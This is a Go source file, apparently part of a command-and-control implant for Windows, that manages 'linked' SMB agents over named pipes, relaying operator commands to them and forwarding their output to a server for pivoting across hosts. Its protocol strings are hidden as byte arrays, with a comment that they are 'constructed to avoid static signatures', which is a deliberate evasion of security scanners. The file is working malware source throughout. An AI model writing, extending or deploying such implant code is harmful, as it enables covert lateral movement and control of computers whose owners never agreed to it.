//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// Link manager strings (constructed to avoid static signatures)
var (
	lmKeyType       = string([]byte{0x74, 0x79, 0x70, 0x65})                                                                                                                                                                                       // type
	lmKeyPayload    = string([]byte{0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64})                                                                                                                                                                     // payload
	lmTypeData      = string([]byte{0x64, 0x61, 0x74, 0x61})                                                                                                                                                                                       // data
	lmTypeDisconn   = string([]byte{0x64, 0x69, 0x73, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74})                                                                                                                                                   // disconnect
	lmTypeHandshake = string([]byte{0x68, 0x61, 0x6e, 0x64, 0x73, 0x68, 0x61, 0x6b, 0x65})                                                                                                                                                         // handshake
	lmStatusActive  = string([]byte{0x61, 0x63, 0x74, 0x69, 0x76, 0x65})                                                                                                                                                                           // active
	lmStatusInact   = string([]byte{0x69, 0x6e, 0x61, 0x63, 0x74, 0x69, 0x76, 0x65})                                                                                                                                                               // inactive
	lmAuthPrefix    = string([]byte{0x41, 0x55, 0x54, 0x48, 0x3a})                                                                                                                                                                                 // AUTH:
	lmAuthOK        = string([]byte{0x4f, 0x4b})                                                                                                                                                                                                   // OK
	lmFmtLinks      = string([]byte{0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x20, 0x4c, 0x69, 0x6e, 0x6b, 0x73, 0x20, 0x28, 0x25, 0x64, 0x29, 0x3a, 0x0a})                                                                                             // Active Links (%d):\n
	lmFmtLinkRow    = string([]byte{0x20, 0x20, 0x5b, 0x25, 0x73, 0x5d, 0x20, 0x25, 0x73, 0x20, 0x2d, 0x20, 0x25, 0x73, 0x20, 0x28, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x65, 0x64, 0x3a, 0x20, 0x25, 0x73, 0x2c, 0x20, 0x6c, 0x61, 0x73, 0x74, 0x20, 0x73, 0x65, 0x65, 0x6e, 0x3a, 0x20, 0x25, 0x73, 0x29, 0x0a}) //   [%s] %s - %s (connected: %s, last seen: %s)\n
	lmTimeFmt       = string([]byte{0x31, 0x35, 0x3a, 0x30, 0x34, 0x3a, 0x30, 0x35})                                                                                                                                                               // 15:04:05
)

// LinkedAgent represents a connected SMB agent
type LinkedAgent struct {
	RoutingID    string    // Short routing ID (assigned by this agent)
	PipePath     string    // Full pipe path (\\server\pipe\name)
	Conn         net.Conn  // Active pipe connection
	Connected    time.Time // When the link was established
	LastSeen     time.Time // Last successful communication
	IsActive     bool      // Whether the link is active
	prependLen   int       // Prepend length for transform reversal (set by last command)
	appendLen    int       // Append length for transform reversal (set by last command)
	mu           sync.Mutex
}

// LinkManager manages connections to linked SMB agents
type LinkManager struct {
	mu           sync.RWMutex
	links        map[string]*LinkedAgent // routingID -> LinkedAgent
	pipeToRoute  map[string]string       // pipePath -> routingID (for dedup)
	nextID       uint32                  // Atomic counter for generating routing IDs
	outboundData chan *LinkDataOut       // Data received from linked agents, to be sent to server

	// Response channels for synchronous command/response patterns
	responseChannels map[string]chan *LinkDataOut // routingID -> response channel
	responseMu       sync.RWMutex

	// Unlink notifications to be sent to server
	unlinkNotifications chan string // Routing IDs that have been unlinked
}

// LinkDataOut represents data from a linked agent to be forwarded to the server
type LinkDataOut struct {
	RoutingID     string `json:"r"`             // Routing ID
	Payload       string `json:"p"`             // Base64 encoded payload (or transformed blob)
	PrependLength int    `json:"pre,omitempty"` // Length of random prepend (for transform reversal)
	AppendLength  int    `json:"app,omitempty"` // Length of random append (for transform reversal)
}

// LinkDataIn represents data from the server destined for a linked agent
type LinkDataIn struct {
	RoutingID     string `json:"r"`             // Routing ID
	Payload       string `json:"p"`             // Base64 encoded payload (or transformed blob)
	PrependLength int    `json:"pre,omitempty"` // Length of random prepend (for transform reversal)
	AppendLength  int    `json:"app,omitempty"` // Length of random append (for transform reversal)
}

var (
	linkManager     *LinkManager
	linkManagerOnce sync.Once
)

// GetLinkManager returns the singleton link manager
func GetLinkManager() *LinkManager {
	linkManagerOnce.Do(func() {
		linkManager = &LinkManager{
			links:               make(map[string]*LinkedAgent),
			pipeToRoute:         make(map[string]string),
			outboundData:        make(chan *LinkDataOut, 100),
			responseChannels:    make(map[string]chan *LinkDataOut),
			unlinkNotifications: make(chan string, 100),
		}
	})
	return linkManager
}

// GenerateRoutingID creates a short, unique routing ID
func (lm *LinkManager) GenerateRoutingID() string {
	id := atomic.AddUint32(&lm.nextID, 1)
	return fmt.Sprintf("%x", id)
}

// Link establishes a connection to an SMB agent via named pipe
func (lm *LinkManager) Link(pipePath string) (string, error) {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	// Check if already linked to this pipe
	if existingRoute, exists := lm.pipeToRoute[pipePath]; exists {
		if link, ok := lm.links[existingRoute]; ok && link.IsActive {
			return "", fmt.Errorf(Err(E5))
		}
	}

	// Connect to the named pipe
	conn, err := connectToPipe(pipePath)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	// Perform lightweight authentication with the SMB agent
	if err := performLinkAuth(conn); err != nil {
		conn.Close()
		return "", fmt.Errorf(ErrCtx(E3, err.Error()))
	}

	// Generate routing ID
	routingID := lm.GenerateRoutingID()

	// Create linked agent entry
	link := &LinkedAgent{
		RoutingID: routingID,
		PipePath:  pipePath,
		Conn:      conn,
		Connected: time.Now(),
		LastSeen:  time.Now(),
		IsActive:  true,
	}

	// Store the link
	lm.links[routingID] = link
	lm.pipeToRoute[pipePath] = routingID

	// Start goroutine to handle incoming data from the SMB agent
	go lm.handleIncomingData(link)

	// log.Printf("[LinkManager] Successfully linked to %s (routing_id: %s)", pipePath, routingID)
	return routingID, nil
}

// Unlink disconnects from an SMB agent
func (lm *LinkManager) Unlink(routingID string) error {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	link, exists := lm.links[routingID]
	if !exists {
		return fmt.Errorf(Err(E4))
	}

	// Send graceful disconnect message
	if link.IsActive && link.Conn != nil {
		sendDisconnectMessage(link.Conn)
	}

	// Close the connection
	if link.Conn != nil {
		link.Conn.Close()
	}

	link.IsActive = false

	// Queue unlink notification to be sent to server
	select {
	case lm.unlinkNotifications <- routingID:
		// log.Printf("[LinkManager] Queued unlink notification for routing_id: %s", routingID)
	default:
		// log.Printf("[LinkManager] Warning: Unlink notification queue full, notification dropped for %s", routingID)
	}

	// Remove from maps
	delete(lm.pipeToRoute, link.PipePath)
	delete(lm.links, routingID)

	// log.Printf("[LinkManager] Unlinked from %s (routing_id: %s)", link.PipePath, routingID)
	return nil
}

// GetLink returns a linked agent by routing ID
func (lm *LinkManager) GetLink(routingID string) (*LinkedAgent, bool) {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	link, exists := lm.links[routingID]
	if !exists || !link.IsActive {
		return nil, false
	}
	return link, true
}

// GetActiveLinks returns all active linked agents
func (lm *LinkManager) GetActiveLinks() []*LinkedAgent {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	var active []*LinkedAgent
	for _, link := range lm.links {
		if link.IsActive {
			active = append(active, link)
		}
	}
	return active
}

// ForwardToLinkedAgent sends data from the server to a linked agent
// This is the legacy version that wraps in JSON envelope
func (lm *LinkManager) ForwardToLinkedAgent(routingID string, payload string) error {
	link, exists := lm.GetLink(routingID)
	if !exists {
		return fmt.Errorf(Err(E4))
	}

	link.mu.Lock()
	defer link.mu.Unlock()

	if link.Conn == nil || !link.IsActive {
		return fmt.Errorf(Err(E4))
	}

	// Send the payload over the pipe (legacy JSON envelope format)
	message := map[string]string{
		lmKeyType:    lmTypeData,
		lmKeyPayload: payload,
	}

	data, err := json.Marshal(message)
	if err != nil {
		return fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Write length-prefixed message
	if err := writeMessage(link.Conn, data); err != nil {
		link.IsActive = false
		return fmt.Errorf(ErrCtx(E11, err.Error()))
	}

	link.LastSeen = time.Now()
	return nil
}

// ForwardToLinkedAgentRaw sends pre-transformed data to a linked agent
// Used when transforms are applied by the server - parent just relays raw bytes
func (lm *LinkManager) ForwardToLinkedAgentRaw(routingID string, payload string, prependLen, appendLen int) error {
	link, exists := lm.GetLink(routingID)
	if !exists {
		return fmt.Errorf(Err(E4))
	}

	link.mu.Lock()
	defer link.mu.Unlock()

	if link.Conn == nil || !link.IsActive {
		return fmt.Errorf(Err(E4))
	}

	// Decode base64 payload - server sent pre-transformed blob
	rawData, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		return fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Write raw bytes directly to pipe (no JSON envelope)
	if err := writeMessage(link.Conn, rawData); err != nil {
		link.IsActive = false
		return fmt.Errorf(ErrCtx(E11, err.Error()))
	}

	// Store padding lengths for this link (needed when reading response)
	link.prependLen = prependLen
	link.appendLen = appendLen

	link.LastSeen = time.Now()
	return nil
}

// ForwardToLinkedAgentAndWait sends data to a linked agent and waits for a response
// Returns the response payload or error if timeout occurs
func (lm *LinkManager) ForwardToLinkedAgentAndWait(routingID string, payload string, timeout time.Duration) (*LinkDataOut, error) {
	// Create a response channel for this routing ID
	respChan := make(chan *LinkDataOut, 1)

	lm.responseMu.Lock()
	lm.responseChannels[routingID] = respChan
	lm.responseMu.Unlock()

	// Clean up when done
	defer func() {
		lm.responseMu.Lock()
		delete(lm.responseChannels, routingID)
		lm.responseMu.Unlock()
	}()

	// Forward the command
	if err := lm.ForwardToLinkedAgent(routingID, payload); err != nil {
		return nil, err
	}

	// Wait for response with timeout
	select {
	case response := <-respChan:
		return response, nil
	case <-time.After(timeout):
		return nil, nil // Timeout is not an error - response will come later via normal queue
	}
}

// ForwardToLinkedAgentRawAndWait sends raw transformed data to a linked agent and waits for a response
// Used when transforms are applied by the server - parent just relays raw bytes
func (lm *LinkManager) ForwardToLinkedAgentRawAndWait(routingID string, payload string, prependLen, appendLen int, timeout time.Duration) (*LinkDataOut, error) {
	// Create a response channel for this routing ID
	respChan := make(chan *LinkDataOut, 1)

	lm.responseMu.Lock()
	lm.responseChannels[routingID] = respChan
	lm.responseMu.Unlock()

	// Clean up when done
	defer func() {
		lm.responseMu.Lock()
		delete(lm.responseChannels, routingID)
		lm.responseMu.Unlock()
	}()

	// Forward the command using raw mode
	if err := lm.ForwardToLinkedAgentRaw(routingID, payload, prependLen, appendLen); err != nil {
		return nil, err
	}

	// Wait for response with timeout
	select {
	case response := <-respChan:
		// log.Printf("[LinkManager] Received synchronous response from %s", routingID)
		return response, nil
	case <-time.After(timeout):
		// log.Printf("[LinkManager] Timeout waiting for response from %s (waited %v)", routingID, timeout)
		return nil, nil // Timeout is not an error - response will come later via normal queue
	}
}

// WaitForLinkData waits for data from a specific routing ID with timeout
// Used after posting to server to wait for handshake response
func (lm *LinkManager) WaitForLinkData(routingID string, timeout time.Duration) (*LinkDataOut, error) {
	// Create a response channel for this routing ID
	respChan := make(chan *LinkDataOut, 1)

	lm.responseMu.Lock()
	lm.responseChannels[routingID] = respChan
	lm.responseMu.Unlock()

	// Clean up when done
	defer func() {
		lm.responseMu.Lock()
		delete(lm.responseChannels, routingID)
		lm.responseMu.Unlock()
	}()

	// Wait for response with timeout
	select {
	case response := <-respChan:
		// log.Printf("[LinkManager] Received data for %s via wait channel", routingID)
		return response, nil
	case <-time.After(timeout):
		return nil, fmt.Errorf(Err(E9))
	}
}

// GetOutboundData returns data that needs to be sent to the server
func (lm *LinkManager) GetOutboundData() []*LinkDataOut {
	var data []*LinkDataOut

	// Drain the channel (non-blocking)
	for {
		select {
		case item := <-lm.outboundData:
			data = append(data, item)
		default:
			return data
		}
	}
}

// GetUnlinkNotifications returns routing IDs that have been unlinked and need to be reported to the server
func (lm *LinkManager) GetUnlinkNotifications() []string {
	var notifications []string

	// Drain the channel (non-blocking)
	for {
		select {
		case routingID := <-lm.unlinkNotifications:
			// log.Printf("[LinkManager] GetUnlinkNotifications: Drained routing_id %s from channel", routingID)
			notifications = append(notifications, routingID)
		default:
			if len(notifications) > 0 {
				// log.Printf("[LinkManager] GetUnlinkNotifications: Returning %d notifications", len(notifications))
			}
			return notifications
		}
	}
}

// handleIncomingData reads data from a linked agent and queues it for the server
// Supports both legacy JSON format and raw transformed format
func (lm *LinkManager) handleIncomingData(link *LinkedAgent) {
	defer func() {
		link.mu.Lock()
		link.IsActive = false
		link.mu.Unlock()
	}()

	for {
		// Read length-prefixed message from pipe
		data, err := readMessage(link.Conn)
		if err != nil {
			return
		}

		// Try to parse as legacy JSON format first
		var message map[string]string
		if err := json.Unmarshal(data, &message); err == nil && message[lmKeyType] != "" {
			// Successfully parsed as JSON with type field - legacy format
			switch message[lmKeyType] {
			case lmTypeData:
				// Build outbound data
				outbound := &LinkDataOut{
					RoutingID: link.RoutingID,
					Payload:   message[lmKeyPayload],
				}
				lm.deliverOutbound(link, outbound)

			case lmTypeHandshake:
				// Initial handshake from SMB agent - queue for server
				outbound := &LinkDataOut{
					RoutingID: link.RoutingID,
					Payload:   message[lmKeyPayload],
				}
				select {
				case lm.outboundData <- outbound:
				default:
				}

			case lmTypeDisconn:
				return
			}
		} else {
			// Not valid JSON or no type field - treat as raw transformed data
			// SMB agent sent pre-transformed blob, just base64 encode and forward
			link.mu.Lock()
			prependLen := link.prependLen
			appendLen := link.appendLen
			link.mu.Unlock()

			outbound := &LinkDataOut{
				RoutingID:     link.RoutingID,
				Payload:       base64.StdEncoding.EncodeToString(data),
				PrependLength: prependLen,
				AppendLength:  appendLen,
			}
			lm.deliverOutbound(link, outbound)
		}

		link.mu.Lock()
		link.LastSeen = time.Now()
		link.mu.Unlock()
	}
}

// deliverOutbound delivers data to synchronous waiter or queues for async processing
func (lm *LinkManager) deliverOutbound(link *LinkedAgent, outbound *LinkDataOut) {
	// Check if someone is waiting synchronously for this response
	lm.responseMu.RLock()
	respChan, hasSyncWaiter := lm.responseChannels[link.RoutingID]
	lm.responseMu.RUnlock()

	if hasSyncWaiter {
		// Send to synchronous waiter (non-blocking)
		select {
		case respChan <- outbound:
		default:
			// Channel full or closed, fall back to async queue
			lm.queueOutboundData(outbound)
		}
	} else {
		// No synchronous waiter, queue for normal async processing
		lm.queueOutboundData(outbound)
	}
}

// queueOutboundData is a helper to queue data for async server delivery
func (lm *LinkManager) queueOutboundData(outbound *LinkDataOut) {
	select {
	case lm.outboundData <- outbound:
		// log.Printf("[LinkManager] Successfully queued data from %s for server", outbound.RoutingID)
	default:
		// log.Printf("[LinkManager] Outbound queue full, dropping data from %s", outbound.RoutingID)
	}
}

// ListLinks returns a summary of all linked agents
func (lm *LinkManager) ListLinks() string {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	if len(lm.links) == 0 {
		return Succ(S0)
	}

	result := fmt.Sprintf(lmFmtLinks, len(lm.links))
	for routingID, link := range lm.links {
		status := lmStatusActive
		if !link.IsActive {
			status = lmStatusInact
		}
		result += fmt.Sprintf(lmFmtLinkRow,
			routingID, link.PipePath, status,
			link.Connected.Format(lmTimeFmt),
			link.LastSeen.Format(lmTimeFmt))
	}
	return result
}

// Helper functions for pipe communication

func connectToPipe(pipePath string) (net.Conn, error) {
	// Use DialTimeout for Windows named pipes
	timeout := 30 * time.Second
	deadline := time.Now().Add(timeout)

	for time.Now().Before(deadline) {
		conn, err := dialPipe(pipePath)
		if err == nil {
			return conn, nil
		}
		time.Sleep(100 * time.Millisecond)
	}

	return nil, fmt.Errorf(Err(E9))
}

func performLinkAuth(conn net.Conn) error {
	// Lightweight authentication:
	// 1. Read challenge from SMB agent
	// 2. Sign with our key
	// 3. Send response

	// Set deadline for auth
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetDeadline(time.Time{}) // Clear deadline

	// Read challenge
	challenge, err := readMessage(conn)
	if err != nil {
		return fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	// Simple challenge-response for now
	// In production, use proper crypto
	response := append([]byte(lmAuthPrefix), challenge...)

	if err := writeMessage(conn, response); err != nil {
		return fmt.Errorf(ErrCtx(E11, err.Error()))
	}

	// Read confirmation
	confirm, err := readMessage(conn)
	if err != nil {
		return fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	if string(confirm) != lmAuthOK {
		return fmt.Errorf(Err(E3))
	}

	return nil
}

func sendDisconnectMessage(conn net.Conn) {
	message := map[string]string{lmKeyType: lmTypeDisconn}
	data, _ := json.Marshal(message)
	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	writeMessage(conn, data)
}

func writeMessage(conn net.Conn, data []byte) error {
	// Length-prefixed message: 4-byte length + data
	length := uint32(len(data))
	header := []byte{
		byte(length),
		byte(length >> 8),
		byte(length >> 16),
		byte(length >> 24),
	}

	if _, err := conn.Write(header); err != nil {
		return err
	}
	_, err := conn.Write(data)
	return err
}

func readMessage(conn net.Conn) ([]byte, error) {
	// Read 4-byte length header
	header := make([]byte, 4)
	if _, err := conn.Read(header); err != nil {
		return nil, err
	}

	length := uint32(header[0]) | uint32(header[1])<<8 | uint32(header[2])<<16 | uint32(header[3])<<24

	// Sanity check
	if length > 10*1024*1024 { // 10MB max
		return nil, fmt.Errorf(Err(E2))
	}

	// Read data
	data := make([]byte, length)
	totalRead := 0
	for totalRead < int(length) {
		n, err := conn.Read(data[totalRead:])
		if err != nil {
			return nil, err
		}
		totalRead += n
	}

	return data, nil
}
